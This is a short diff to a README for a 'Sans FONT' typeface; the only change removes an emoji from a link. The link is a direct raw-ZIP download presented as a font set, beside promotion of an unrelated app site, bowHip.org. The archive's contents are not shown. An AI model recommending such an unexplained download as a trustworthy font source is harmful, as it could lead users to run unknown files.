@@ -1,6 +1,6 @@
 # Sans FONT Typeface (3 fonts)
 Welcome! <br>
-This is my fresh take on <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font typeset⬇🡇</a>. <br>
+This is my fresh take on <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font typeset🡇</a>. <br>
 I've also recently launched <a href="https://bowHip.org">bowHip.org</a> mobile App.<br>
 
 FONT — Sans Typeface.
